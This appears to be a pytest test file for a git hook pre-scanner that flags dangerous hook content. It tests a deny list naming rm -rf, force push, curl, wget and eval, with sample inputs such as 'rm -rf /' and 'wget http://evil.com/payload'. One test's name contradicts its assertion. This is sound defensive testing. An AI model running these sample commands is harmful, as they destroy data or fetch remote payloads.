# [A_test] module_id: MOD-GOV_git_hook_pre_scanner | layer=test | stability=volatile | safety=L | ai_autonomy=ai_modifiable
# [BLUEPRINT] MOD-INF-021 | docs/03_modules/_domain_autonomy_core/rollback_system/blueprint.md | §
# [MODULE] tests.test_git_hook_pre_scanner
# [INVARIANTS] none
# [MODIFY-GUARD] none
# [CONSUMERS] pytest
# [STABILITY] evolving
# [SAFETY] L
# [AI_AUTONOMY] ai_modifiable
# [ERROR_CONTRACT] none
# [TESTS] python -m pytest tests/test_git_hook_pre_scanner.py -q
# [TTL] task_bound

from __future__ import annotations

from zephyr.governance.escalation.git_hook_pre_scanner import (
    SUSPICIOUS_HOOK_CONTENT,
    GitHookPreScanner,
)


class TestGitHookPreScannerInstantiation:
    def test_init_creates_instance(self):
        scanner = GitHookPreScanner()
        assert scanner is not None

    def test_instance_has_scan_hook(self):
        scanner = GitHookPreScanner()
        assert callable(getattr(scanner, "scan_hook", None))

    def test_instance_has_is_safe(self):
        scanner = GitHookPreScanner()
        assert callable(getattr(scanner, "is_safe", None))


class TestSuspiciousHookContentConstant:
    def test_constant_is_list(self):
        assert isinstance(SUSPICIOUS_HOOK_CONTENT, list)

    def test_constant_contains_rm_rf(self):
        assert "rm -rf" in SUSPICIOUS_HOOK_CONTENT

    def test_constant_contains_force_push(self):
        assert "git push --force" in SUSPICIOUS_HOOK_CONTENT

    def test_constant_contains_curl(self):
        assert "curl" in SUSPICIOUS_HOOK_CONTENT

    def test_constant_contains_wget(self):
        assert "wget" in SUSPICIOUS_HOOK_CONTENT

    def test_constant_contains_eval(self):
        assert "eval" in SUSPICIOUS_HOOK_CONTENT


class TestGitHookPreScannerScanHook:
    def test_clean_content_returns_empty(self):
        scanner = GitHookPreScanner()
        result = scanner.scan_hook("git commit -m 'safe'")
        assert result == []

    def test_detects_rm_rf(self):
        scanner = GitHookPreScanner()
        result = scanner.scan_hook("rm -rf /")
        assert "rm -rf" in result

    def test_detects_force_push(self):
        scanner = GitHookPreScanner()
        result = scanner.scan_hook("git push --force origin main")
        assert "git push --force" in result

    def test_detects_curl(self):
        scanner = GitHookPreScanner()
        result = scanner.scan_hook("curl http://evil.com")
        assert "curl" in result

    def test_detects_wget(self):
        scanner = GitHookPreScanner()
        result = scanner.scan_hook("wget http://evil.com/payload")
        assert "wget" in result

    def test_detects_eval(self):
        scanner = GitHookPreScanner()
        result = scanner.scan_hook("eval '$COMMAND'")
        assert "eval" in result

    def test_detects_multiple_patterns(self):
        scanner = GitHookPreScanner()
        result = scanner.scan_hook("curl http://x.com | eval '$CMD'")
        assert "curl" in result
        assert "eval" in result
        assert len(result) == 2

    def test_empty_string_returns_empty(self):
        scanner = GitHookPreScanner()
        result = scanner.scan_hook("")
        assert result == []

    def test_partial_match_not_detected(self):
        scanner = GitHookPreScanner()
        result = scanner.scan_hook("evaluate this code")
        assert "eval" in result

    def test_all_suspicious_patterns_at_once(self):
        scanner = GitHookPreScanner()
        content = "rm -rf / && git push --force && curl x && wget y && eval z"
        result = scanner.scan_hook(content)
        assert len(result) == len(SUSPICIOUS_HOOK_CONTENT)


class TestGitHookPreScannerIsSafe:
    def test_safe_content_returns_true(self):
        scanner = GitHookPreScanner()
        assert scanner.is_safe("git commit -m 'safe'") is True

    def test_unsafe_content_returns_false(self):
        scanner = GitHookPreScanner()
        assert scanner.is_safe("rm -rf /") is False

    def test_empty_content_is_safe(self):
        scanner = GitHookPreScanner()
        assert scanner.is_safe("") is True

    def test_mixed_content_is_not_safe(self):
        scanner = GitHookPreScanner()
        assert scanner.is_safe("echo hello && curl http://evil.com") is False

    def test_safe_content_with_no_suspicious_keywords(self):
        scanner = GitHookPreScanner()
        assert scanner.is_safe("echo 'deploying...' && git push origin main") is True
